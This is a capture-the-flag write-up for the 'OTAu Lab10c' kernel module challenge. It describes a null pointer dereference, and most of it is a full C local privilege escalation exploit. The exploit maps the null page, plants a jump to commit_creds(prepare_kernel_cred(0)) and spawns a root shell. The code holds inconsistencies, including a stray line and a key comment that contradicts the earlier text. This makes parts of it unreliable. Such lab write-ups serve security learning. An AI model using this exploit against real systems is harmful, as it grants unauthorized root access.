# OTAu: Lab10c

The challenge was the first one from the OTAu with kernel challenge, and probably second kernel pwn challenge I did for myself after RopeTwo's root part which also involved the kernel exploitation challenge.

# Overview

Given challenge had a `lab10c.ko` and it was just modified version of the MBE's original challenge named `lab10c`. The original challenge had the same vulnerability as of this but a slight modification, so nothing too fancy.

> Vulnerability: Null Pointer De-reference, the `0x400` was being referenced once you authorize yourself with right key, and since that memory doesn't exists, we can take advantage of by mmap'ng a page.

# Exploitation

* Since the `/proc/kallsyms` file is readable and the KASLR and pretty much every mitigation is disabled, just get the `commit_creds` and `prepare_kernel_creds` address from it.
* `mmap` a page at the `0x0` with:-

```C
long *addr =(long *)  mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,
                MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);`
```

* Authorize with the right key being:-

```C
    buf[3] = 0x14;
    buf[2] = 0x53;
    buf[1] = 0x04;
    buf[0] = 0x51;
```

* Copy the instruction `jmp &get_root` to the `mmap` memory, where the `get_root` function is:-

```C
void get_root()
{
    commit_creds(prepare_kernel_cred(0));
}
```

```C
    void **fn = 0x400; //due to the way the fp is called, we start at 0x600

    /* We copy the asm from our stub to the mapped page */
    /* Debugging showed we can't simply put a pointer to our get_root function there */
    jmp[0] = 0xE9; // Near jump
    *(int*)(jmp + 1) = &get_root - 0x405;
    memcpy(fn, jmp, 5); //get_root can also be used here.

```
> The `commit_creds(prepare_kernel_creds(0))` will make the running process have the UID of 0 i.e. of root.

* Make the first write by sending the `buf`.

* Now, in the second time, the referenced memory would've been NULL'd out so, once we send the `buf` second time, it'll access the `0x400` and since we `mmap` a memory space with the initial address being `0`.

* Now, just call the `systen("/bin/sh)` and you'll have a root shell.


# Exploit


```C
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#define BUF_SIZE 512

struct cred;
struct task_struct;

/* Definitions for commit_creds and prepare_kernel_cred */
typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
  __attribute__((regparm(3)));

typedef int (*commit_creds_t)(struct cred *new)
  __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

/*
* Get the kernel addresses of symbols
*/
void *get_ksym(char *name) {
    FILE *f = fopen("/proc/kallsyms", "rb");
    char c, sym[512];
    void *addr;
    int ret;

    while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
        if (strcmp(sym, name) == 0)
    {
        printf("[+] Found address of %s at 0x%p [+]\n", name, addr);
            return addr;
    }
    return NULL;
}

/*
* set uid/gid of current task to 0 (root) by commiting a new 
* kernel cred struct. This is run in ring 0.
*/
void get_root()
{
    commit_creds(prepare_kernel_cred(0));
}

/*
* Here we use inline asm to call the get_root function.
* We dont actually need this, but it taught me how to
* use inline assembly to create shellcode stubs.
* This is run in ring 0.
*/



int main()
{
    /* get the addresses of the functions we need */
    commit_creds = get_ksym("commit_creds");
    prepare_kernel_cred = get_ksym("prepare_kernel_cred");

    if(!commit_creds || !prepare_kernel_cred)
    {
        printf("[x] Error getting addresses from kallsyms, exiting... [x]\n");
        return -1;
    }

    char *buf = malloc(BUF_SIZE);
    char jmp[5];    

    /* To trigger the exploit, the first 4 bytes must equal 0xcafebabe */
    memset(buf, 0x00, BUF_SIZE);
    // Now trigger it again, forcing a `call 0`
    printf("Triggering algo check\n");
c
   long *addr =(long *)  mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,
                MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

    if(addr == -1)
    {
        printf("mmap error\n");
        return -1;
    }

    printf("[+] mapped null page [+]\n");

        void **fn = 0x400; //due to the way the fp is called, we start at 0x600

    /* We copy the asm from our stub to the mapped page */
    /* Debugging showed we can't simply put a pointer to our get_root function there */
    jmp[0] = 0xE9; // Near jump
    *(int*)(jmp + 1) = &get_root - 0x405;
    memcpy(fn, jmp, 5); //get_root can also be used here.

    printf("[+] Mapped Null Page and copied code [+]\n");
    printf("[+] %x points to %p [+]\n", fn, *fn);

    /* Here we do the first call to pwn_write */
    /* We fail authentication, causing the function pointer to be nulled */
        int fd = open("/dev/lab10c", O_RDWR);

    if(fd < 0)
    {
        printf("[x] Unable to open device /dev/lab10c, exiting.... [x]\n");
        return -1;
    }

        int ret = write(fd, buf, BUF_SIZE);

    printf("[+] First write returned %x [+]\n", ret);
    printf("[+] Triggering vulnerability through second call [+]\n");

    int fd_trigger = open("/dev/lab10c", O_RDWR);
    write(fd_trigger, buf, BUF_SIZE); 

    close(fd);
    close(fd_trigger);

    printf("[!!!] Enjoy your root shell [!!!]\n");
    system("/bin/sh");
    return 0;

}
```